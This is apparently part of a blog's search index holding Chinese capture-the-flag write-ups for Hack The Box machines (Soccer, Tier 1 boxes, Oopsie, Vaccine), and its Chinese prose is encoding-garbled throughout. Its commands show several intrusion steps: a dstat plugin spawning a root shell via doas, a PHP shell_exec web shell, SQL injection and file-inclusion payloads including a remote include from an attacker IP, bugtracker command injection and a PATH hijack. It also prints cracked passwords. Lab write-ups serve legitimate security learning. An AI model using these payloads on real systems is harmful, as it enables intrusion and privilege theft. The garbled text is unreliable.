localhost.\n\næ²¡æœ‰åˆ©ç”¨ç‚¹\nå°è¯•suidææƒï¼Œæ‰§è¡Œfind / -perm -4000 2&gt;/dev/null -ls\nplayer@soccer:~$ find / -perm -4000 2&gt;/dev/null -ls\n    70968     44 -rwsr-xr-x   1 root     root        42224 Nov 17 09:09 /usr/local/bin/doas\n    18263    140 -rwsr-xr-x   1 root     root       142792 Nov 28 04:55 /usr/lib/snapd/snap-confine\n     7696     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25 13:09 /usr/lib/dbus-1.0/dbus-daemon-launch-helper\n    14300    464 -rwsr-xr-x   1 root     root         473576 Mar 30  2022 /usr/lib/openssh/ssh-keysign\n    16207     24 -rwsr-xr-x   1 root     root          22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1\n     7700     16 -rwsr-xr-x   1 root     root          14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device\n     1753     40 -rwsr-xr-x   1 root     root          39144 Feb  7  2022 /usr/bin/umount\n     2093     40 -rwsr-xr-x   1 root     root          39144 Mar  7  2020 /usr/bin/fusermount\n     1752     56 -rwsr-xr-x   1 root     root          55528 Feb  7  2022 /usr/bin/mount\n     1647     68 -rwsr-xr-x   1 root     root          67816 Feb  7  2022 /usr/bin/su\n    13720     44 -rwsr-xr-x   1 root     root          44784 Nov 29 11:53 /usr/bin/newgrp\n     3023     84 -rwsr-xr-x   1 root     root          85064 Nov 29 11:53 /usr/bin/chfn\n     1724    164 -rwsr-xr-x   1 root     root         166056 Jan 19  2021 /usr/bin/sudo\n     3027     68 -rwsr-xr-x   1 root     root          68208 Nov 29 11:53 /usr/bin/passwd\n     3026     88 -rwsr-xr-x   1 root     root          88464 Nov 29 11:53 /usr/bin/gpasswd\n     3024     52 -rwsr-xr-x   1 root     root          53040 Nov 29 11:53 /usr/bin/chsh\n     2242     56 -rwsr-sr-x   1 daemon   daemon        55560 Nov 12  2018 /usr/bin/at\n      135    121 -rwsr-xr-x   1 root     root         123560 Nov 25 17:29 /snap/snapd/17883/usr/lib/snapd/snap-confine\n      814     84 -rwsr-xr-x   1 root     root          85064 Mar 14  2022 /snap/core20/1695/usr/bin/chfn\n      820     52 -rwsr-xr-x   1 root     root          53040 Mar 14  2022 /snap/core20/1695/usr/bin/chsh\n      889     87 -rwsr-xr-x   1 root     root          88464 Mar 14  2022 /snap/core20/1695/usr/bin/gpasswd\n      973     55 -rwsr-xr-x   1 root     root          55528 Feb  7  2022 /snap/core20/1695/usr/bin/mount\n      982     44 -rwsr-xr-x   1 root     root          44784 Mar 14  2022 /snap/core20/1695/usr/bin/newgrp\n      997     67 -rwsr-xr-x   1 root     root          68208 Mar 14  2022 /snap/core20/1695/usr/bin/passwd\n     1107     67 -rwsr-xr-x   1 root     root          67816 Feb  7  2022 /snap/core20/1695/usr/bin/su\n     1108    163 -rwsr-xr-x   1 root     root         166056 Jan 19  2021 /snap/core20/1695/usr/bin/sudo\n     1166     39 -rwsr-xr-x   1 root     root          39144 Feb  7  2022 /snap/core20/1695/usr/bin/umount\n     1255     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25 13:09 /snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n     1627    463 -rwsr-xr-x   1 root     root              473576 Mar 30  2022 /snap/core20/1695/usr/lib/openssh/ssh-keysign\n\nå…·æœ‰ suid æƒé™çš„ä¸å¯»å¸¸æ–‡ä»¶æ˜¯ /usr/local/bin/doas\nGoogleä¸€ä¸‹doas\nhttps://underc0de.org/foro/gnulinux/doas-una-alternativa-a-sudo-simple-ligera-y-segura/#:~:text=doas%20es%20un%20programa%20para,espec%C3%ADficos%20para%20ejecutar%20comandos%20espec%C3%ADficos\nç®€å•è®²ï¼Œdoas æ˜¯ä¸€ä¸ªä»¥å¦ä¸€ä¸ªç”¨æˆ·èº«ä»½è¿è¡Œå‘½ä»¤çš„ç¨‹åºï¼ˆç±»ä¼¼äº sudoï¼Œä½†æ›´ç®€å•ï¼‰ï¼Œå®ƒçš„é»˜è®¤ä½ç½®åœ¨â€œ&#x2F;etc&#x2F;doas.confâ€ä¸­\nplayer@soccer:~$ find / -name doas.conf 2&gt;/dev/null\n/usr/local/etc/doas.conf\nplayer@soccer:~$ cat /usr/local/etc/doas.conf\npermit nopass player as root cmd /usr/bin/dstat\n\nå…è®¸ç”¨æˆ·â€œplayerâ€ä½¿ç”¨ root è¿›è¡Œ dstat\næŸ¥çœ‹dstatå®˜æ–¹æ–‡æ¡£\nhttps://github.com/dstat-real/dstat\nhttps://linux.die.net/man/1/dstat\n Dstat å…è®¸è¿è¡Œè‡ªå®šä¹‰æ’ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªæ’ä»¶å¹¶ä½¿ç”¨ dstat è¿è¡Œå®ƒï¼Œåç§°å¿…é¡»ä¸ºdstat_*.pyï¼Œæ’ä»¶å­˜æ”¾çš„ç›®å½•ä¸º/usr/local/share/dstat/\nç§»åŠ¨åˆ°æ­¤ç›®å½•ä¸‹ï¼Œåˆ›å»ºä¸€ä¸ªæ’ä»¶ï¼Œå†™å…¥ä»£ç \nimport os\nos.system(&quot;sh&quot;)\n\næ‰§è¡Œæ­¤æ’ä»¶\nplayer@soccer:~$ cd /usr/local/share/dstat/\nplayer@soccer:/usr/local/share/dstat$ vim dstat_ahh.py\nplayer@soccer:/usr/local/share/dstat$ doas /usr/bin/dstat --ahh\n/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module&#39;s documentation for alternative uses\n  import imp\n# ls\ndstat_ahh.py\n# whoami\nroot\n# cat /root/root.txt\nfd1854e763db6cbf6e47036de2ad7bbf\n# \n\nå¾—åˆ°root flag\næ€»ç»“easyä¸€å…±æ˜¯äº”ä¸ªé¶æœºï¼Œä¹‹å‰å·²ç»æ‰“è¿‡ä¸€ä¸ªäº†ï¼Œè¿™é‡Œå°±æ˜¯å‰©ä¸‹å››ä¸ªçš„å…¨éƒ¨æµç¨‹ã€‚\næ€»ä½“çš„å¤§æ¦‚æµç¨‹ä¸ºç«¯å£å‘ç°â€”&gt;80ç«¯å£å­åŸŸåæšä¸¾ã€ç›®å½•æ‰«æâ€”&gt;webæ¼æ´åˆ©ç”¨â€”&gt;æ‹¿åˆ°ç½‘ç«™ç®¡ç†å‘˜æƒé™â€”&gt;æŸ¥æ‰¾å„ç§ä¿¡æ¯â€”&gt;æ‹¿åˆ°ä¸»æœºæœ¬åœ°ç”¨æˆ·æƒé™â€”&gt;ææƒåˆ°root\nä¸­é—´è¿˜ä¼šç©¿æ’å„ç§æ¼æ´åˆ©ç”¨ï¼Œæ€»ä½“æ€è·¯å°±æ˜¯ç½‘é¡µæƒé™â€”&gt;æœ¬åœ°æƒé™â€”&gt;rootæƒé™\né‡äº‹ä¸å†³å°±ä¸ŠGoogleï¼Œé€šè¿‡ç½‘é¡µç«¯è·å¾—çš„å„ç§ä¿¡æ¯ï¼Œå¦‚ç½‘ç«™æ¡†æ¶ç‰ˆæœ¬ï¼ŒæœåŠ¡å™¨ç‰ˆæœ¬ï¼Œgoogleä¸€ä¸‹å°±èƒ½å‡ºæ¥æ¼æ´åˆ©ç”¨ç‚¹ä»¥åŠå„ç§expï¼Œæ‹¿æ¥å°±èƒ½ç”¨\nä¿¡æ¯æ³„éœ²æ–¹é¢ï¼Œå„ç§æ¡†æ¶çš„é»˜è®¤å¯†ç ã€é…ç½®æ–‡ä»¶é‡Œçš„ä¿¡æ¯ã€‚é…ç½®æ–‡ä»¶çš„åœ°å€ä¸Šå®˜ç½‘å°±èƒ½æ‰¾åˆ°\nææƒæ–¹é¢ï¼Œè¿™é‡Œåªç”¨åˆ°äº†sudoæ»¥ç”¨  suidä¸¤ç§Linuxä¸‹çš„ææƒæ–¹å¼ï¼Œå¯ä»¥ä¸Šä¼ ä¸€äº›æ£€æµ‹è„šæœ¬ï¼Œè‡ªåŠ¨æ”¶é›†èƒ½åˆ©ç”¨çš„ææƒç‚¹\n","tags":["æ‰“é¶","HTB"]},{"title":"Hack the box-Starting point TIER1é€šå…³","url":"/2023/02/02/Hack%20the%20box-Starting%20point%20TIER1%E9%80%9A%E5%85%B3/","content":"TIER1Appointmenté¶æœº\nå¸¸è§„nmapæ‰«ç«¯å£\n\n80ç«¯å£å¼€æ”¾äº†ä¸€ä¸ªwebæœåŠ¡ï¼Œè®¿é—®\n\nä¸€ä¸ªç™»å½•çª—å£ï¼Œé¢˜ç›®æç¤ºsqlæ³¨å…¥ï¼Œè¾“å…¥usernameï¼šadminâ€™# ç™»å½•\n\næ‹¿åˆ°flag\n1.SQLå…¨ç§°æ˜¯ä»€ä¹ˆï¼Ÿ\nç­”æ¡ˆï¼šStructured Query Languageã€‚ä¸­æ–‡åå­—å«ç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€\n2.æœ€å¸¸è§çš„SQLæ¼æ´ç±»å‹æ˜¯ä»€ä¹ˆï¼Ÿ\nç­”æ¡ˆï¼šSQL injection #SQLæ³¨å…¥\n3.PIIä»£è¡¨ä»€ä¹ˆæ„æ€ï¼Ÿ\nç­”æ¡ˆï¼špersonally identifiable informationï¼Œé€šè¿‡ç™¾åº¦æ¥çš„ï¼Œä¸ªäººèº«ä»½ä¿¡æ¯æˆ–è€…ä¸ªäººéªŒè¯ä¿¡æ¯\n4.OWASP å‰ 10 ååˆ—è¡¨å°†æ­¤æ¼æ´çš„åˆ†ç±»å‘½åä¸ºä»€ä¹ˆï¼Ÿ\nç­”æ¡ˆï¼šA03:2021-Injection\n5.80ç«¯å£è·‘çš„æ˜¯ä»€ä¹ˆæœåŠ¡ä»¥åŠä»€ä¹ˆç‰ˆæœ¬ï¼Ÿ\nç­”æ¡ˆï¼šä¸Šé¢è¯´è¿‡äº†\n6.httpsçš„ç«¯å£æ˜¯ä»€ä¹ˆï¼Ÿ\nç­”æ¡ˆï¼š443\n7.webåº”ç”¨çš„æ–‡ä»¶å¤¹å«ä»€ä¹ˆï¼Ÿ\nç­”æ¡ˆï¼šdirectory\n8.Not foundçš„å“åº”ä»£ç æ˜¯ä»€ä¹ˆï¼Ÿ\nç­”æ¡ˆï¼š404\n9.åœ¨ Gobuster ä¸­ä½¿ç”¨ä»€ä¹ˆå¼€å…³æ¥æŒ‡å®šæˆ‘ä»¬æ­£åœ¨å¯»æ‰¾ç›®å½•è€Œä¸æ˜¯å­åŸŸï¼Ÿ\nç­”æ¡ˆï¼šdirï¼ŒGobusteræ˜¯ä¸€ä¸ªç›®å½•çŒœè§£å·¥å…·\nhttps://github.com/OJ/gobuster\n10.ä½¿ç”¨ä»€ä¹ˆç¬¦å·æ³¨é‡Šä»£ç ï¼Ÿç­”æ¡ˆï¼š#\n11.If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned? \nç­”æ¡ˆï¼šCongratulations\nSequelé¶æœºå¸¸è§„nmapæ‰«ç«¯å£\næ‰«å‡º3306 mariadbæœåŠ¡\nå°è¯•è¿æ¥\n\næ‹¿åˆ°flag\n1.æ‰«ææ—¶ï¼Œmysqlè·‘åœ¨å“ªä¸ªç«¯å£ï¼Ÿ\n3306\n2.ç›®æ ‡ä¸»æœºä¸Šè·‘çš„mysqlæ˜¯ä»€ä¹ˆç‰ˆæœ¬ï¼Ÿ\nmariadb\n3.æˆ‘ä»¬éœ€è¦ä½¿ç”¨ä»€ä¹ˆå¼€å…³æ¥æŒ‡å®š MySQL æœåŠ¡çš„ç™»å½•ç”¨æˆ·åï¼Ÿ\n-u\n4.å“ªä¸ªç”¨æˆ·åå…è®¸æˆ‘ä»¬åœ¨ä¸æä¾›å¯†ç çš„æƒ…å†µä¸‹ç™»å½• MariaDBï¼Ÿ\nroot\n5.ä½¿ç”¨ä»€ä¹ˆç¬¦å·å¯ä»¥è·å–ä¸€å¼ è¡¨çš„æ‰€æœ‰ä¿¡æ¯?\n\n\n\n6.ä½¿ç”¨ä»€ä¹ˆç¬¦å·ç»“æŸä¸€ä¸ªæŸ¥è¯¢?;\n7.è¿™ä¸ªMySQLå®ä¾‹ä¸­æœ‰ä¸‰ä¸ªæ•°æ®åº“åœ¨æ‰€æœ‰MySQLå®ä¾‹ä¸­éƒ½æ˜¯é€šç”¨çš„ã€‚è¿™ä¸ªä¸»æœºæ‰€ç‰¹æœ‰çš„ç¬¬å››ä¸ªåå­—æ˜¯ä»€ä¹ˆ?\nhtb\nCrocodileé¶æœºå¸¸è§„æ‰«ç«¯å£\n\nftpè¿æ¥\n\nåˆ©ç”¨å¾—åˆ°çš„è´¦å·å¯†ç ç™»å½•80ç«¯å£ç½‘é¡µ\n\næ‹¿åˆ°flag\n\n1.åœ¨nmapä¸­ä½¿ç”¨é»˜è®¤è„šæœ¬æ‰«æçš„æ˜¯ä»€ä¹ˆå‘½ä»¤ï¼Ÿ\n-sCã€‚\n2.21ç«¯å£ä¸Šè·‘çš„æœåŠ¡çš„ç‰ˆæœ¬æ˜¯ä»€ä¹ˆï¼Ÿ\nvsftpd3.0.3\n3.å…è®¸ftpåŒ¿åç™»å½•çš„ä»£ç æ˜¯ä»€ä¹ˆï¼Ÿ\n230\n4.ä»€ä¹ˆå‘½ä»¤å¯ä»¥ç”¨äºä¸‹è½½ftpä¸Šé¢çš„æ–‡ä»¶\nget\n6.usernameåˆ—è¡¨ä¸­ï¼Œå¬èµ·æ¥æƒé™æ¯”è¾ƒé«˜çš„ç”¨æˆ·åæ˜¯ä»€ä¹ˆï¼Ÿ\nadmin\n7.What version of Apache HTTP Server is running on the target host? \napache httpd 2.4.41\n8.What switch can we use with Gobuster to specify we are looking for specific filetypes? \n-X\n9.æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç›®å½•è›®åŠ›è¯†åˆ«å“ªä¸ªPHPæ–‡ä»¶ï¼Œä»è€Œæä¾›å‘webæœåŠ¡è¿›è¡Œèº«ä»½éªŒè¯çš„æœºä¼š?\n login.php\nResponderé¶æœº1.å½“ä½¿ç”¨IPåœ°å€è®¿é—®webæœåŠ¡æ—¶ï¼Œæˆ‘ä»¬è¢«é‡å®šå‘åˆ°çš„åŸŸæ˜¯ä»€ä¹ˆ?\nunika.htb\n\n2.æœåŠ¡å™¨ä¸Šä½¿ç”¨å“ªç§è„šæœ¬è¯­è¨€ç”Ÿæˆç½‘é¡µ?\nphp\n3.ç”¨äºåŠ è½½ä¸åŒè¯­è¨€ç‰ˆæœ¬çš„ç½‘é¡µçš„URLå‚æ•°åç§°æ˜¯ä»€ä¹ˆ?\npage\n4.Which of the following values for the page parameter would be an example of exploiting a Local File Include (LFI) vulnerability: â€œfrench.htmlâ€, â€œ&#x2F;&#x2F;10.10.14.6&#x2F;somefileâ€, â€œ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;.. &#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hostsâ€, â€œminikatz.exeâ€\n..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts\n5.Which of the following values for the page parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: â€œfrench.htmlâ€, â€œ&#x2F;&#x2F;10.10.14.6&#x2F;somefileâ€, â€œ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hostsâ€, â€œminikatz.exeâ€ \n&#x2F;&#x2F;10.10.14.6&#x2F;somefile\n6.What does NTLM stand for? \nNew Technology LAN Manager\n7.æˆ‘ä»¬åœ¨Responderå®ç”¨ç¨‹åºä¸­ä½¿ç”¨å“ªä¸ªæ ‡å¿—æ¥æŒ‡å®šç½‘ç»œæ¥å£?\n-i \n8.æœ‰å‡ ä¸ªå·¥å…·å¯ä»¥ä½¿ç”¨NetNTLMv2æŒ‘æˆ˜&#x2F;å“åº”ï¼Œå¹¶å°è¯•æ•°ç™¾ä¸‡ä¸ªå¯†ç ï¼Œä»¥æŸ¥çœ‹æ˜¯å¦æœ‰ä»»ä½•å¯†ç ç”Ÿæˆç›¸åŒçš„å“åº”ã€‚ä¸€ä¸ªè¿™æ ·çš„å·¥å…·é€šå¸¸è¢«ç§°ä¸ºâ€œjohnâ€ï¼Œä½†å…¨åæ˜¯ä»€ä¹ˆ?\njohn the ripper\n9.What is the password for the administrator user? \nbadminton\n10.æˆ‘ä»¬å°†ä½¿ç”¨ Windows æœåŠ¡ï¼ˆå³åœ¨boxä¸Šè¿è¡Œï¼‰ä½¿ç”¨æˆ‘ä»¬æ¢å¤çš„å¯†ç è¿œç¨‹è®¿é—® Responder æœºå™¨ã€‚å®ƒä¾¦å¬çš„ TCP ç«¯å£æ˜¯ä»€ä¹ˆï¼Ÿ\n5985\nå› ä¸ºé‡å®šå‘åŸŸçš„é—®é¢˜ï¼Œæˆ‘ä»¬æ˜¯è®¿é—®ä¸äº†çš„ä¼šæŠ¥é”™ï¼Œè¿™é‡Œä¿®æ”¹ä¸€ä¸‹hostsæ–‡ä»¶\n\nnmapæ‰«ç«¯å£\nifconfigæŸ¥çœ‹æœ¬æœºåœ¨å†…ç½‘ä¸­çš„ip\n\nresponderå¼€å¯ç›‘å¬\n\nç½‘é¡µè®¿é—®è¿œç¨‹æ–‡ä»¶åŒ…å«\n\nè®¿é—®åç›‘å¬åˆ°hashå€¼\næ¥ä¸‹æ¥ä½¿ç”¨johnç ´è§£ï¼Œ\n\nå¾—åˆ°administratorè´¦å·å¯†ç \nä¹‹å‰æ‰«åˆ°ä¸€ä¸ª5985ç«¯å£å¼€äº†ä¸ªwinrmæœåŠ¡ï¼Œä½¿ç”¨evil-winrmè¿œç¨‹è¿æ¥\n\næ‹¿åˆ°shell\n\næŸ¥æ‰¾flag\n\næ‹¿åˆ°flag\nThreeé¶æœºå¸¸è§„nmap\n\nè®¿é—®webæœåŠ¡\n\né€šè¿‡é‚®ç®±è”æƒ³åˆ°åŸŸå\nå¯ä»¥é€šè¿‡gobusteræ¥çˆ†ç ´å­åŸŸåï¼Œç„¶åç»‘å®šip å­åŸŸå\né¢˜ç›®æœ‰æç¤ºè¯´æ˜¯s3.thetoppers.htb\n\næ·»åŠ è§£æ\n\nè®¿é—®å­åŸŸåï¼Œå›æ˜¾\n\ns3æ˜¯äºšé©¬é€Šçš„ä¸€ä¸ªå¯¹è±¡å­˜å‚¨æœåŠ¡\nhttps://aws.amazon.com/cn/s3/\nè®¿é—®å¹¶æ‰§è¡Œå‘½ä»¤\n\næœ¬æ¥æƒ³å°è¯•æ‰§è¡Œcdå‘½ä»¤ï¼Œå‘ç°æ²¡åŠæ³•ï¼ŒæŸ¥çœ‹æç¤ºå¯ä»¥æ‰§è¡Œcpå‘½ä»¤ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œæ‹¿åˆ°shell\n\nå…ˆæœ¬åœ°ç”Ÿæˆä¸€ä¸ªä¸€å¥è¯æœ¨é©¬shell.php\n\nä¸Šä¼ æˆåŠŸ\n\nè®¿é—®ï¼Œç›´æ¥æ‰§è¡Œå‘½ä»¤å³å¯æ‹¿åˆ°flag\n\n\n\nä¹Ÿå¯ä»¥é€šè¿‡èšå‰‘ç­‰webshellå·¥å…·è¿æ¥\næˆ–è€…é€šè¿‡åå¼¹shell\næ–¹æ³•å¾ˆå¤šï¼Œæ¯•ç«Ÿå·²ç»æŠŠé©¬ä¼ åˆ°äº†æœåŠ¡å™¨ã€‚\né—®ç­”é¢˜å°±ä¸å†™äº†ï¼Œç­”æ¡ˆè¿‡ç¨‹ä¸­éƒ½æœ‰ã€‚\næ€»ç»“  tier1ä¹Ÿæ˜¯æ²¡ä»€ä¹ˆéš¾çš„åœ°æ–¹ï¼Œç¬¬ä¸€ä¸ªé¶æœºwebæœåŠ¡ç™»å½•æ¡†sqlæ³¨å…¥ï¼Œç¬¬äºŒä¸ªé¶æœº3306mariadbè¿æ¥æŸ¥è¯¢ï¼Œç¬¬ä¸‰ä¸ªé¶æœºftpè¿æ¥æ‹¿åå°è´¦å·å¯†ç ï¼Œç¬¬å››ä¸ªé¶æœºè¿œç¨‹æ–‡ä»¶åŒ…å«ã€Responderç›‘å¬ã€johnç ´è§£æ‹¿åˆ°winrmæœåŠ¡ç”¨æˆ·å¯†ç ï¼Œevil-winrmè¿œç¨‹è¿æ¥ï¼Œç¬¬äº”ä¸ªé¶æœºgobusterçˆ†ç ´å­åŸŸåã€awscliä¸Šä¼ æœ¨é©¬ã€æ‹¿shellã€‚åé¢è¿˜æœ‰äº”ä¸ªvipé¶æœºï¼Œå°±æ²¡æ‰“äº†ã€‚\n","tags":["æ‰“é¶","HTB","æ¸—é€æµ‹è¯•"]},{"title":"Oopsieé¶æœº","url":"/2023/02/06/Oopsie%E9%9D%B6%E6%9C%BA/","content":"\n\n\nnmapç«¯å£æ‰«æ\nå¼€äº†80webç«¯å£\nè®¿é—®web\næƒ¯ä¾‹F12æŸ¥çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆä¿¡æ¯\n\nçœ‹åˆ°ä¸€ä¸ªåƒæ˜¯ç™»å½•åœ°å€çš„urlè·¯å¾„ï¼Œè®¿é—®\n\nå¯ä»¥ä½¿ç”¨è®¿é—®è€…èº«ä»½ç™»å½•\nç‚¹å‡»accounté¡µé¢\n\nè¶Šæƒæ›´æ”¹id,å°†idæ”¹ä¸º1æ—¶\n\nå›æ˜¾äº†adminè´¦æˆ·çš„accessID\nç‚¹å‡»uploadsï¼Œå‘ç°éœ€è¦superadminç”¨æˆ·æƒé™\n\næŠ“åŒ…å°è¯•ä¼ªé€ adminç”¨æˆ·è®¿é—®ï¼Œçœ‹èƒ½ä¸èƒ½ä¸Šä¼ æ–‡ä»¶\n\nå°†cookieä¸­çš„useræ”¹ä¸º34322ï¼Œroleæ”¹ä¸ºadminï¼Œè®¿é—®æˆåŠŸï¼Œå°†æ•°æ®åŒ…æ”¾å‡º\n\nä¸Šä¼ shellæ¥åˆ°æ–‡ä»¶ä¸Šä¼ é¡µé¢\nå‡†å¤‡ä¸€ä¸ªshell.php&lt;?php echo shell_exec($_GET[&#39;shell&#39;]);?&gt;,ä¸Šä¼ \næ³¨æ„ï¼šä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œä¹Ÿæ˜¯éœ€è¦å°†cookieä¿®æ”¹ä¸ºadminçš„\n\nä¸Šä¼ æˆåŠŸåï¼Œè®¿é—®&#x2F;uploads&#x2F;shell.php\n\næ‰§è¡ŒæˆåŠŸ\né‡æ–°ä¸Šä¼ åå¼¹shellçš„PHPä»£ç \nwebshellåœ¨&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;æ–‡ä»¶å¤¹ä¸‹\n\nå¤åˆ¶è¿›bpï¼Œä¸Šä¼ \n\nipç«¯å£æ”¹ä¸ºè‡ªå·±ipå’Œncç›‘å¬çš„ç«¯å£\n\n\næ‰¾åˆ°user.txtæ‹¿åˆ°flagï¼šf2c74ee8db7983851ab2a96a44eb7981\n\nåœ¨db.phpä¸­çœ‹åˆ°robertç”¨æˆ·å¯†ç M3g4C0rpUs3r!  \nææƒç”¨ ls -lh $(find / -perm -u=s -type f 2&gt;/dev/null) æŸ¥çœ‹å…·æœ‰ SUID çš„å¯æ‰§è¡Œæ–‡ä»¶\n\næ‰§è¡Œ bugtrackerï¼Œæç¤ºç”¨æˆ·è¾“å…¥ Provide Bug IDï¼Œéšæ„è¾“å…¥\n\nå‘ç°ç¨‹åºè°ƒç”¨äº†catï¼Œè¿™ä¸ªcatæ˜¯rootç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œæœ‰setuidæƒé™ï¼Œsetuidæ˜¯æŒ‡èµ‹äºˆä¸€ä¸ªè¿›ç¨‹ä»–æ‰€æœ‰è€…çš„æƒé™ï¼Œä»»æ„å­˜å–è¯¥æ–‡ä»¶çš„æ‰€æœ‰è€…èƒ½ä½¿ç”¨çš„å…¨éƒ¨ç³»ç»Ÿèµ„æºã€‚&#x2F;&#x2F;å°±æ˜¯è¯´ä½ åªè¦æœ‰æƒæ‰§è¡Œè¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶é‡Œè°ƒç”¨äº†åªæœ‰rootç³»ç»Ÿå‘½ä»¤ï¼Œé‚£ä¹ˆæ‰§è¡Œçš„æ—¶å€™è¿™ä¸ªè¿›ç¨‹å°±ç›¸å½“äºroot\nè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥æ‰§è¡Œ,åœ¨è¾“å…¥ Provide Bug IDæ—¶åé¢è·Ÿä¸Š;bin&#x2F;bash\n\nå¾—åˆ°rootæƒé™ä¸‹çš„shell\n\nå¾—åˆ°rootflagï¼šaf13b0bee69f8a877c3faf667f7beacf\n //è¿™é‡Œä¹Ÿå¯ä»¥é‡‡ç”¨å¦ä¸€ç§æ–¹æ³•ææƒï¼Œç¨‹åºè°ƒç”¨äº†cat,æˆ‘ä»¬å¯ä»¥è‡ªå†™ä¸€ä¸ªcatï¼Œè®©ç¨‹åºè°ƒç”¨æˆ‘ä»¬è‡ªå†™çš„cat\n\nexport PATH=/tmp:$PATH //å°†/tmpç›®å½•è®¾ç½®ä¸ºç¯å¢ƒå˜é‡\ncd /tmp/ //åˆ‡æ¢åˆ°/tmpç›®å½•ä¸‹\necho â€˜/bin/shâ€™ &gt; cat //åœ¨æ­¤æ„é€ æ¶æ„çš„catå‘½ä»¤\nchmod +x cat  //è®¾ç½®ä¼˜å…ˆçº§ï¼Œä¼šé»˜è®¤ä¼šæ‰§è¡Œæˆ‘ä»¬åˆ›å»ºçš„catå‘½ä»¤\n\n","tags":["æ‰“é¶","HTB"]},{"title":"Vaccineé¶æœº","url":"/2023/02/10/Vaccine%E9%9D%B6%E6%9C%BA/","content":"æµç¨‹æ¦‚è¿°ï¼š FTPåŒ¿åæ”»å‡» â€”&gt; zip2johnç ´è§£hashå€¼å¾—åˆ°å¯†ç  â€”&gt;webæºç ä¿¡æ¯æ³„éœ²â€”&gt;ç™»å½•webåå° â€”&gt;sqlæ³¨å…¥æ”»å‡»â€”&gt;åå¼¹shellæ‹¿åˆ°æƒé™â€”&gt; viææƒroot\n\n\nnmapæ‰«ç«¯å£\n\nåˆ©ç”¨anonymousç”¨æˆ·ï¼Œftpè¿æ¥ä¸»æœº\n\ngetä¸‹æ¥backup.zipæ–‡ä»¶\nè§£å‹æ—¶å‘ç°éœ€è¦å¯†ç ï¼Œåˆ©ç”¨johnå¾—åˆ°hashè¿›è¡Œç ´è§£\n\næ‹¿åˆ°è§£å‹å¯†ç ï¼Œè§£å‹æŸ¥çœ‹index.phpæ–‡ä»¶\n\næ‰¾åˆ°adminç”¨æˆ·MD5å¯†ç \nMD5ç¢°æ’æ‹¿åˆ°æ˜æ–‡å¯†ç \n\nç™»å½•ç½‘é¡µ\n\næœ‰ä¸ªæœç´¢æ¡†ï¼Œæƒ³åˆ°sqlæ³¨å…¥ï¼Œè¾“å…¥1â€˜ï¼Œæœç„¶æŠ¥é”™ï¼Œç¡®å®šä¸ºsqlæ³¨å…¥ï¼ŒæŠ“åŒ…sqlmapä¸€æŠŠæ¢­\n\nå°†æ•°æ®åŒ…æ”¾å…¥ä¸€ä¸ªæ–‡ä»¶\n\næ‰«å‡ºä¸ºpostgresqlæ•°æ®åº“ï¼Œç›´æ¥â€“os-shellæ‹¿shellï¼Œè¿™é‡Œå‡ºç°é—®é¢˜ï¼Œè°·æ­Œæœäº†ä¸€ä¸‹ï¼Œå¾ˆå¤šäººåœ¨è¿™å‡ºé”™ï¼Œåº”è¯¥æ˜¯é¶æœºçš„é—®é¢˜\nhttps://forum.hackthebox.com/t/machine-name-vaccine-stuck-on-getting-sql-code-execution-shell/2513\nåœ¨GitHubä¸Šæ‰¾åˆ°ä¸ªå¸ˆå‚…å†™çš„EXPï¼šhttps://github.com/florianges/-HTB-Vaccine_sql_injection\nè„šæœ¬æè¿°å¾ˆæ¸…æ¥šï¼Œå°†ä¿¡æ¯ä¿®æ”¹\nåœ¨æœ¬åœ°è·‘ä¸ª80ç«¯å£æä¾›ncçš„ä¸‹è½½ï¼Œåœ¨è¿™ä¹‹å‰è¦å°†ncæ”¾å…¥ä½ è·‘æœåŠ¡çš„ç›®å½•ä¸‹(cp /bin/nc.traditional ~/Desktop/nc)\n\næœ¬åœ°å¼€å¯ncç›‘å¬\n\nè·‘è„šæœ¬\n\nè¿™ä¸ªè„šæœ¬å®é™…å°±æ˜¯é€šè¿‡æ³¨å…¥åˆ›å»ºç›¸åº”çš„è¡¨ã€å­—æ®µï¼Œä»ç¨‹åºä¸­å¤åˆ¶æ•°æ®åˆ°è¿™ä¸ªå­—æ®µè¡¨é‡Œï¼Œç„¶ååé¢ä¸‹è½½ncï¼Œèµ‹äºˆncæ‰§è¡Œæƒé™ï¼Œå¹¶ä¸”æ‰§è¡Œåå¼¹shellå‘½ä»¤ã€‚\n\næ‹¿åˆ°user flag\n\nåœ¨dashboard.phpæ–‡ä»¶å‘ç°ç”¨æˆ·åpostgreså¯†ç P@s5w0rd!\nsshè¿æ¥ä¸»æœº\nsudo -l 